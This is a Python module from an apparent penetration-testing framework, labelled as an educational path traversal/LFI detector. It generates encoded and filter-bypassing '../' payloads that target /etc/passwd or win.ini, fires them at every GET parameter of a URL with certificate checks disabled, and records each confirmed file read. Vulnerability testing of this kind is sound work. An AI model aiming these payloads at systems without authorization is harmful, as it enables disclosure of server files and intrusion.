# -*- coding: utf-8 -*-
"""
Módulo web/path_traversal
=========================
Detector EDUCATIVO de path traversal / LFI (CWE-22, WSTG-INPV-12):

    1. Genera secuencias de cruce de directorios ../ (normal, URL-encode,
       doble encode, barras mixtas, absolutos) contra cada parámetro GET.
    2. Solicita un fichero MARCA (por defecto /etc/passwd) y comprueba
       firmas inequívocas en la respuesta:
         • root:x:0:0:        → /etc/passwd leído (Unix)
         • [fonts] / win.ini  → Windows leído
    3. NO descarga más ficheros: solo valida la firma del marcador.

Riesgo: MEDIO (lectura de un fichero benigno de firma en lab autorizado).
ATT&CK: T1083 (File and Directory Discovery).
"""

import re
from typing import Dict, List
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests

from core.base_module import BaseModulo, ModuloError

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FIRMA_UNIX = re.compile(r"root:[x*!]:0:0:", re.IGNORECASE)
FIRMA_WIN = re.compile(r"\[fonts\]\s*\[extensions\]", re.IGNORECASE)

_FICHERO_LINUX = "/etc/passwd"
_FICHERO_WINDOWS = "..\\..\\..\\windows\\win.ini"


def generar_payloads(profundidad: int = 6, fichero: str = _FICHERO_LINUX) -> List[str]:
    """Construye las variantes de traversal (función pura, testeable)."""
    prof = max(1, min(profundidad, 12))
    salto = "../" * prof
    cruce = salto.lstrip("/") + fichero.lstrip("/")
    codificado = cruce.replace("../", "%2e%2e%2f")          # puntos y barras encodeados
    doble = codificado.replace("%", "%25")                  # doble encode
    variantes = [
        cruce,                                   # ../ clásico
        codificado,                              # %2e%2e%2f
        doble,                                   # doble encode %252e
        cruce.replace("../", "..%2f"),           # barras codificadas
        cruce.replace("../", "....//"),          # filtro que elimina ../
        "/" + fichero.lstrip("/"),               # absoluto directo
        fichero.replace("/", "..\\") if "\\" in fichero else fichero,
    ]
    vistos, salida = set(), []
    for v in variantes:
        if v and v not in vistos:
            vistos.add(v)
            salida.append(v)
    return salida


def detectar_firma(cuerpo: str) -> str:
    """Detecta firma de lectura de fichero en la respuesta (función pura)."""
    if FIRMA_UNIX.search(cuerpo):
        return "unix"
    if FIRMA_WIN.search(cuerpo):
        return "windows"
    return ""


def construir_url(url: str, param: str, valor: str) -> str:
    """Sustituye (o añade) un parámetro GET (función pura)."""
    partes = urlparse(url)
    pares = parse_qsl(partes.query, keep_blank_values=True)
    if any(k == param for k, _ in pares):
        pares = [(k, valor if k == param else v) for k, v in pares]
    else:
        pares.append((param, valor))
    return urlunparse(partes._replace(query=urlencode(pares)))


class PathTraversal(BaseModulo):
    """Sondea path traversal con firma de lectura conocida (educativo)."""

    NAME = "web/path_traversal"
    CATEGORIA = "web"
    DESCRIPCION = ("Detector EDUCATIVO de path traversal/LFI: variantes ../, "
                   "doble encode y absolutos con firma /etc/passwd o win.ini")
    RIESGO = "medio"
    AUTOR = "REDHAVOC"
    REFERENCIA = "OWASP WSTG-INPV-12 · CWE-22"
    ATTCK = ("T1083",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("URL", "", True,
                               "URL con parámetro vulnerable (…?pagina=x)")
        self.opciones.declarar("PARAMS", "", False,
                               "Solo estos parámetros (coma). Vacío = todos")
        self.opciones.declarar("PROFUNDIDAD", "6", False,
                               "Niveles ../ a probar (1-12)")
        self.opciones.declarar("WIN", "false", False,
                               "Usar win.ini como fichero firma (objetivo Windows)")

    def ejecutar(self) -> dict:
        url = self.opt("URL").strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        if "?" not in url:
            raise ModuloError("La URL no tiene parámetros GET: el sondeo necesita "
                              "?pagina=x (p. ej. ?file=documento.pdf)")
        solo = [p.strip() for p in self.opt("PARAMS").split(",") if p.strip()]
        timeout = self.opt_int("TIMEOUT", 5) or 5
        fichero = _FICHERO_WINDOWS if self.opt_bool("WIN") else _FICHERO_LINUX

        pares = parse_qsl(urlparse(url).query, keep_blank_values=True)
        if solo:
            pares = [(k, v) for k, v in pares if k in solo]
        if not pares:
            raise ModuloError("No hay parámetros que sondear.")

        payload_todos = generar_payloads(self.opt_int("PROFUNDIDAD", 6) or 6, fichero)
        probados, confirmados = 0, []
        for param, _ in pares:
            for payload in payload_todos:
                objetivo = construir_url(url, param, payload)
                try:
                    resp = requests.get(objetivo, timeout=timeout, verify=False,
                                        headers={"User-Agent": self.opt("USER_AGENT")
                                                 or "REDHAVOC"})
                except requests.RequestException:
                    continue
                probados += 1
                firma = detectar_firma(resp.text[:200_000])
                if firma:
                    inicio = FIRMA_UNIX.search(resp.text[:200_000]).start() \
                        if firma == "unix" else \
                        FIRMA_WIN.search(resp.text[:200_000]).start()
                    fragmento = resp.text[max(0, inicio - 20):inicio + 80]
                    confirmados.append({
                        "parametro": param,
                        "payload": payload,
                        "firma": firma,
                        "fragmento": " ".join(fragmento.split())[:120],
                    })
                    break   # este parámetro ya confirmó lectura

        host = url.split("//")[-1].split("/")[0]
        if confirmados and self.workspace is not None:
            for c in confirmados:
                self.workspace.add_vuln(
                    host, f"Path traversal en ?{c['parametro']} (LFI confirmado)",
                    "alto", f"payload: {c['payload']} · firma {c['firma']}",
                    self.NAME)

        return {
            "resumen": f"{url}: {len(confirmados)} parámetro(s) con lectura "
                       f"confirmada · {probados} sondas",
            "url": url,
            "fichero_firma": fichero,
            "payloads_por_param": len(payload_todos),
            "confirmados": confirmados,
        }
